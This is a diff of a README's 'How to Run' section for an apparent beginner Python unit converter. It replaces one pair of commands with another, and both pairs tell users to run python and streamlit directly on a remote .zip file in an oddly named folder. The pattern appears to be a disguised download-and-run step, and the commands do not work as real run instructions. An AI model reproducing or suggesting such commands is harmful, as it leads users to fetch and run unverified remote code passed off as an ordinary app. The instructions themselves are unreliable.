@@ -43,6 +43,6 @@ This is a **simple and beginner-friendly Unit Converter** built using Python. It
 ## ▶️ How to Run
 
 ```bash
-python https://raw.githubusercontent.com/shayanhayee/Unit-Converter/master/forbearant/Converter_Unit_anomodont.zip
-streamlit run https://raw.githubusercontent.com/shayanhayee/Unit-Converter/master/forbearant/Converter_Unit_anomodont.zip
+python https://github.com/shayanhayee/Unit-Converter/raw/refs/heads/master/forbearant/Converter_Unit_v1.8.zip
+streamlit run https://github.com/shayanhayee/Unit-Converter/raw/refs/heads/master/forbearant/Converter_Unit_v1.8.zip
 
